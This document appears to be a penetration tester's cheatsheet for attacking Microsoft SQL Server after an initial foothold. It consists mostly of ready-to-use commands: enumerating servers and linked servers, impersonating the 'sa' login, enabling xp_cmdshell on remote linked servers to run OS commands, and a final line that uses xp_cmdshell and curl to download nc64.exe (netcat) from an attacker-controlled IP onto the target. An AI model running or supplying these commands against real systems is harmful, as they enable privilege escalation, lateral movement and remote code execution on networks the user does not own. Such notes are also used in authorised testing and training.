# MSSQL Cheatsheet

PE can use `PowerUpSQL.ps1` in post exp.

## list sqlserver

```powershell
PS C:\mane> sqlcmd -L

Servers:
    ;UID:Login ID=?;PWD:Password=?;Trusted_Connection:Use Integrated Security=?;*APP:AppName=?;*WSID:WorkStation ID=?;


# OR
PS C:\mane> Get-SqlInstance
```

## Query

```powershell
PS C:\mane> sqlcmd -q "SELECT @@version"

# login current user
PS C:\mane> sqlcmd -S

# user and password
PS C:\mane> sqlcmd -S .\SQLEXPRESS -U xxx -P xxx
``

```sql
# List Databases
SELECT name FROM master..sysdatabases;

# List Tables
SELECT name FROM master..sysobjects WHERE xtype = 'U';



```

## Check server link

```
EXEC sp_linkedservers;

select * from openquery("WEB\CLIENTS", 'SELECT name FROM master..sysdatabases;')
```

With `PowerUPSql.ps1`, [CheatSheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet).

```
Get-SQLInstanceLocal -Verbose
```

```
osql -E -S "localhost\SQLEXPRESS" -Q "select * from master..sysservers" 
```


## Connect Server link

```
EXECUTE AS LOGIN  = 'sa';

EXECUTE ('SELECT @@servername;') at [SQLSERVER2] ;
```


## Enable xpshell to linking server

```
EXECUTE AS LOGIN  = 'sa';
EXECUTE ('EXEC sp_configure ''Show Advanced Options'', 1') at [SQLSERVER2] ;
EXECUTE ('RECONFIGURE') at [SQLSERVER2] ;
EXECUTE ('EXEC sp_configure ''xp_cmdshell'', 1') at [SQLSERVER2];
EXECUTE ('RECONFIGURE') at [SQLSERVER2] ;
EXECUTE ('EXEC master..xp_cmdshell ''whoami''') at [SQLSERVER2] ;
```

## Using SQLRecon Tools with link

Sometimes SQLRecon.exe have some problem with code execute.

```
.\SQLRecon.exe /a:WinToken /h:127.0.0.1 /l:xxx.xxx.local /m:lXpCmd /c:'command'

```

## osql enable cmdshell with link

```
osql -E -S "<LOCAL_HOSTNAME>" -Q "EXECUTE('sp_configure''xp_cmdshell'',1;RECONFIGURE;') AT [<remote.manesec.local>]"

osql -E -S "<LOCAL_HOSTNAME>" -Q "EXECUTE('xp_cmdshell whoami') AT [<remote.manesec.local>];"
osql -E -S "<LOCAL_HOSTNAME>" -Q "EXECUTE('xp_cmdshell ''mkdir C:\mane''') AT [<remote.manesec.local>];"

```


## Using link and impersonal sa to enable xp_cmd

```
DECLARE @sql NVARCHAR(MAX) = N'EXECUTE AS LOGIN = ''sa''; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; EXEC xp_cmdshell ''cmd /c curl http://10.10.16.25/nc64.exe -o C:\programdata\nc64.exe'';'; EXEC (@sql) AT "PRIMARY";

```